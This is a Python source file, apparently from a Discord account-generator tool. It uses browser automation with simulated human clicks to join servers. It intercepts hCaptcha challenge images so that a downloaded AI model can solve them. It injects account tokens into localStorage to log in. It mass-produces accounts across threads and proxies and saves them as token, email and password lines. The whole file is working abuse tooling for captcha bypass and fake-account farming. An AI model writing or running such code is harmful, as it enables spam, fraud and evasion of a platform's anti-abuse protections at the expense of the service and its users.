        await self.click_humanly("", '[data-list-item-id *= "create-join-button"]')
        # Click Join another Server Button
        await self.page.wait_for_timeout(500)
        await self.click_humanly("", '[class *= "footerButton-24QPis"]')
        # Type Invite Code
        await self.page.wait_for_timeout(1000)
        await self.type_humanly("[placeholder='https://discord.gg/hTKzmak']", self.invite_link)
        # Clicking Join Server Button
        # Todo: Bad Code
        await self.click_humanly("", '[class = "button-f2h6uQ lookFilled-yCfaCM colorBrand-I6CyqQ sizeMedium-2bFIHr grow-2sR_-F"]')

        # Collecting all Images requested from hCaptcha (Captcha Images)
        self.images = []

        async def image_append(route, request):
            if request.resource_type == "image" and "hcaptcha" in request.url:
                self.images.append(request.url)
            await route.continue_()
        await self.page.route("https://imgs.hcaptcha.com/*", image_append)
        # Clicking Captcha Checkbox
        try:
            self.checkbox = self.page.frame_locator(
                '[title *= "hCaptcha security challenge"]').locator('[id="checkbox"]')
            await self.checkbox.scroll_into_view_if_needed(timeout=10000)
        except:
            self.logger.info("No ServerJoin Captcha was detected!")
            return True
        await self.click_humanly(self.checkbox, "")
        await self.page.wait_for_timeout(2000)
        captcha = await self.captcha_solver()

        return True

    # Testing (Maybe used later?)
    async def login_token(self):
        # self.bot = discum.Client(
        #     token=self.token, log=False, user_agent=self.faker.useragent, proxy=self.proxy.http_proxy if self.proxy.proxy else None)
        # Going on Discord Register Site
        try:
            await self.page.goto("https://discord.com/register")
        except:
            self.logger.error("Site didn´t load")
            return False
        await self.page.evaluate(str('setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"' + self.token + '"`}, 2500); setTimeout(() => {location.reload();}, 2500);'))
        await self.page.wait_for_timeout(5000)
        # self.humanize_token()

        if self.invite_link:
            await self.join_server()

        await self.page.wait_for_timeout(10000)

        await self.close()
        exit()


async def main():
    # Downloading all AI Files
    dir_model = os.path.join(os.path.dirname(__file__), "model")
    if not os.path.exists(dir_model):
        print("Download all AI Files...")
        r = requests.get(
            "https://api.github.com/repos/QIN2DIM/hcaptcha-challenger/releases")
        for asset in r.json()[0].get("assets"):
            url = asset.get("browser_download_url")
            name = asset.get("name")
            path = os.path.join(dir_model, name)
            print(f"Dowloading {name}...")
            Solutions.download_model_(dir_model, path, url, name)

    print(""" _____     __     ______     __         ______     ______     __  __
/\  __-.  /\ \   /\  ___\   /\ \       /\  __ \   /\  ___\   /\ \/ /
\ \ \/\ \ \ \ \  \ \___  \  \ \ \____  \ \ \/\ \  \ \ \____  \ \  _"-.
 \ \____-  \ \_\  \/\_____\  \ \_____\  \ \_____\  \ \_____\  \ \_\ \_\
  \/____/   \/_/   \/_____/   \/_____/   \/_____/   \/_____/   \/_/\/_/    | Made by Vinyzu
                                                                           | https://github.com/Vinyzu/DiscordGenerator""")
    mode = input("[Select] - [Generation Mode]\n" + "<1> Generate Unclaimed Token\n" +
                 "<2> Generate Token\n" + "<3> Test Captcha\n" + "</> ")
    if mode not in ("1", "2", "3"):
        raise ValueError("Invalid Mode provided")
    else:
        mode = int(mode)

    if mode in (1, 2):
        email = input("[Select] - [Email Verification]\n" + "<1> Verification Enabled\n" +
                      "<2> No Verification\n" + "</> ")
        if email not in ("1", "2"):
            raise ValueError("Invalid Mode provided")
        else:
            email = True if email == "1" else False
    else:
        email = False

    if mode in (1, 2):
        humanize = input("[Select] - [Token Humanization]\n" + "<1> Humanization Enabled\n" +
                         "<2> No Humanization\n" + "</> ")
        if humanize not in ("1", "2"):
            raise ValueError("Invalid Mode provided")
        else:
            humanize = True if humanize == "1" else False
    else:
        humanize = False

    threads = input("[Input] - [Threads Amount]\n" + "</> ")
    try:
        threads = int(threads)
    except:
        raise ValueError("Invalid ThreadAmount provided")

    proxy_file = input("[Drag&Drop] - [Proxy File]\n" +
                       "<?> Or Leave empty for Proxyless Mode\n" + "</> ")
    if proxy_file:
        if not os.path.isfile(proxy_file):
            raise ValueError("Provided ProxyPath isnt a file!")
        proxies = open(proxy_file, 'r').readlines()
    else:
        proxies = None

    output_file = input("[Drag&Drop] - [Output File]\n" +
                        "<?> Or Leave empty to use output.txt\n" + "</> ")
    if output_file:
        if not os.path.isfile(output_file):
            raise ValueError("Provided OutputPath isnt a file!")
    else:
        output_file = "output.txt"

    invite = input("[Input] - [Invite Link]\n" +
                   "<?> Either parse a InviteLink, or an InviteCode\n" + "</> ")

    if not validators.url(invite) and invite:
        invite_link = f"https://discord.gg/{invite}"
        if not validators.url(invite_link) or not requests.get(f"https://discordapp.com/api/v8/invites/{invite}").ok:
            raise ValueError(f"Invalid InviteLink: {invite}")
    else:
        invite_code = invite.split("/")[-1]
        if invite and not requests.get(f"https://discordapp.com/api/v8/invites/{invite_code}").ok:
            raise ValueError(f"Invalid InviteLink: {invite}")
        invite_link = invite

    output_format = input("[Input] - [Output Format]\n" +
                          "<?> Token: token, Email: email, Password: pass, Proxy: proxy\n" +
                          "<?> Leave empty for standart output: token:email:pass\n" + "</> ")
    if not output_format:
        output_format = "token:email:pass"
    for item in output_format.split(":"):
        if item not in ["token", "email", "pass", "proxy"]:
            raise ValueError(f"Invalid OutputItem: {item}")

    os.system('cls' if os.name == 'nt' else 'clear')

    while True:
        threadz = []
        for _ in range(threads):
            proxy = random.choice(proxies) if proxies else None
            threadz.append(Generator().initialize(
                proxy, mode, output_file, email, humanize, output_format, invite_link))

        await asyncio.gather(*threadz)
        await asyncio.sleep(2)


if __name__ == '__main__':
    asyncio.run(main())
